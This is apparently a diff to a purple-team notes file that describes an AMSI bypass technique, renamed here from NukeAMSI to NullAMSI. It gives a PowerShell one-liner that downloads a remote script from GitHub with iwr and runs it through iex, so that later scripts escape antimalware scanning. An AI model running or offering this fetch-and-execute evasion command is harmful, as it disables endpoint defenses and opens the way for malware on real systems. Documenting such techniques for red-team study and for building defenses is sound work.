@@ -8,7 +8,7 @@ Hence within succession we can bypass antimalware scan from modern AV, not only 
 
 ## Methods
 
-### NukeAMSI
+### NullAMSI
 
 #### What is this
 
@@ -16,9 +16,9 @@ A new attack that targeting to a bug in `amsi.dll` that allow user to write on s
 
 #### Running
 
-You can download script from [NukeAMSI.ps1](https://github.com/anonymous300502/Nuke-AMSI/blob/main/NukeAMSI.ps1) then run in powershell, or invoke by running:
+You can download script from [NullAMSI.ps1](https://github.com/papcaii/PurpleTeam-Note/blob/main/Tactics/defense-evasion/AMSI-BYPASS/Payloads/NullAMSI/Invoke-NullAMSI.ps1) then run in powershell, or invoke by running:
 ```powershell
-iex (iwr "https://raw.githubusercontent.com/anonymous300502/Nuke-AMSI/refs/heads/main/NukeAMSI.ps1" -UseBasicParsing).Content
+iex (iwr "https://raw.githubusercontent.com/papcaii/PurpleTeam-Note/refs/heads/main/Tactics/defense-evasion/AMSI-BYPASS/Payloads/NullAMSI/Invoke-NullAMSI.ps1" -UseBasicParsing).Content
 ```
 
 Then we can running powershell script without being scanned by AMSI
